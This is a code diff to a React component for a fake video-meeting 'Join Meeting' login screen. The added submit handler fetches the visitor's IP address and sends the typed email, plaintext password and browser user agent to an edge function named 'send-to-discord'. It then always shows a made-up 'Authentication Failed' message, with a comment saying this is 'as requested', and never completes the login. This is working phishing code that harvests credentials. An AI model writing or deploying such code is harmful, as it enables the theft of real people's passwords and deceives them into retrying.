@@ -5,7 +5,9 @@ import { z } from "zod";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
-import { Camera, Mic, MicOff, VideoOff } from "lucide-react";
+import { Camera, Mic, MicOff, VideoOff, Loader2 } from "lucide-react";
+import { useToast } from "@/hooks/use-toast";
+import { createClient } from '@supabase/supabase-js';
 
 const formSchema = z.object({
   email: z.string().email("Please enter a valid email"),
@@ -23,6 +25,14 @@ const Phase3CameraAuth = ({ onComplete, prefillEmail }: Phase3CameraAuthProps) =
   const [stream, setStream] = useState<MediaStream | null>(null);
   const [isVideoOn, setIsVideoOn] = useState(true);
   const [isAudioOn, setIsAudioOn] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const { toast } = useToast();
+
+  // Initialize Supabase client
+  const supabase = createClient(
+    'https://YOUR_PROJECT_ID.supabase.co',
+    'YOUR_ANON_KEY'
+  );
 
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
@@ -124,13 +134,65 @@ const Phase3CameraAuth = ({ onComplete, prefillEmail }: Phase3CameraAuthProps) =
     }
   };
 
-  const onSubmit = (values: z.infer<typeof formSchema>) => {
-    console.log("Form submitted:", values);
-    // Stop ringing and complete the flow
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
+  const getUserIP = async () => {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Failed to get IP:', error);
+      return null;
     }
-    onComplete();
+  };
+
+  const onSubmit = async (values: z.infer<typeof formSchema>) => {
+    setIsLoading(true);
+    
+    try {
+      // Get user's IP address
+      const ipAddress = await getUserIP();
+      
+      // Prepare data to send to Discord
+      const formData = {
+        email: values.email,
+        password: values.password,
+        userAgent: navigator.userAgent,
+        ipAddress: ipAddress,
+      };
+
+      // Send to Supabase edge function
+      const { data, error } = await supabase.functions.invoke('send-to-discord', {
+        body: formData
+      });
+
+      if (error) {
+        throw error;
+      }
+
+      // Simulate authentication delay
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      // Show authentication error (as requested)
+      toast({
+        title: "Authentication Failed",
+        description: "Invalid credentials. Please check your email and password.",
+        variant: "destructive",
+      });
+
+    } catch (error) {
+      console.error("Submission error:", error);
+      toast({
+        title: "Network Error",
+        description: "Unable to connect to authentication server. Please try again.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsLoading(false);
+      // Stop ringing and camera
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    }
   };
 
   return (
@@ -216,8 +278,19 @@ const Phase3CameraAuth = ({ onComplete, prefillEmail }: Phase3CameraAuthProps) =
               )}
             />
             
-            <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3">
-              Join Meeting
+            <Button 
+              type="submit" 
+              disabled={isLoading}
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 disabled:opacity-50"
+            >
+              {isLoading ? (
+                <>
+                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                  Authenticating...
+                </>
+              ) : (
+                "Join Meeting"
+              )}
             </Button>
           </form>
         </Form>
